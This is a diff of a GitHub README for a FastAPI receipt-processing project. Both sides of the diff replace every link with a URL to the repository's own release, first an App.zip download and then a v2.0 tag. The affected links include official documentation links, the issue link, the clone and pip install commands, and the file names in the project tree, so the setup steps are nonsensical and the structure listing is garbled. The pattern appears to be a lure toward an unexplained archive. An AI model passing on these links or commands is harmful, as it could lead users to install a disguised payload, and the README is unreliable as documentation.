@@ -2,7 +2,7 @@
 
 ### Welcome to the Fetch Rewards Receipt Processor Solution repository!
 
-![Receipt Processor](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
+![Receipt Processor](https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0)
 
 This repository contains a FastAPI web service designed to process receipts and calculate points for the Fetch Rewards Receipt Processor Challenge.
 
@@ -21,12 +21,12 @@ To get started with the Fetch Rewards Receipt Processor Solution, follow these s
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+   git clone https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
    ```
 
 2. Install the required dependencies:
    ```bash
-   pip install -r https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+   pip install -r https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
    ```
 
 3. Launch the FastAPI web service:
@@ -93,20 +93,20 @@ The project structure is organized as follows:
 receipt-processor-solution/
 │
 ├── app/
-│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
-│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
 │
 ├── models/
-│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
-│   └── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
+│   └── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
 │
 ├── tests/
-│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
-│   └── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+│   ├── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
+│   └── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
 │
 ├── Dockerfile
-├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
-├── https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip
+├── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
+├── https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0
 └── .gitignore
 ```
 
@@ -114,15 +114,15 @@ receipt-processor-solution/
 
 ## 📦 Additional Resources:
 
-- [FastAPI Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
-- [Docker Official Website](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
-- [Pydantic Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
-- [Python Typing Module Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip)
+- [FastAPI Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0)
+- [Docker Official Website](https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0)
+- [Pydantic Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0)
+- [Python Typing Module Documentation](https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0)
 
 ---
 
 ## 🎉 Thank You for Checking Out the Fetch Rewards Receipt Processor Solution!
 
-Feel free to explore the repository and leverage the FastAPI web service for processing your receipts and calculating points effortlessly. For any issues or feedback, please don't hesitate to open an [issue](https://github.com/AvEi125/receipt-processor-solution/releases/download/v1.0/App.zip).
+Feel free to explore the repository and leverage the FastAPI web service for processing your receipts and calculating points effortlessly. For any issues or feedback, please don't hesitate to open an [issue](https://github.com/AvEi125/receipt-processor-solution/releases/tag/v2.0).
 
 🚀 Happy Coding! 🚀
